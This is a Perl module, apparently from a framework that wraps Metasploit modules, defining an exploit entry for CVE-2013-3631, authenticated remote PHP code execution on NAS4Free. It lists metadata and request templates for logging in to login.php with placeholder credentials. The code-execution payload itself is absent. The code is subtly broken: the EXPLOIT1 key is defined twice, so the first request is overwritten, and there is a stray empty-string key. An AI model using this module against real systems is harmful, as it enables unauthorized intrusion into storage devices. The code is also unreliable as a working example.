package MSFExploits::Exploits::NAS4FREE::MSF::Nas4freePhpExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::NAS4FREE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "Nas4freePhpExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "" => "application/octet-stream",
  "CVE" => "CVE-2013-3631",
  "DESCRIPTION" => "

      NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have

      the code executed remotely. This module was successfully tested against NAS4Free version

      9.1.0.1.804. Earlier builds are likely to be vulnerable as well.

      ",
  "MSF_MODULE" => "nas4free_php_exec",
  "REFERENCES" => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  "TITLE" => "NAS4Free Arbitrary Remote Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'login.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /login.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
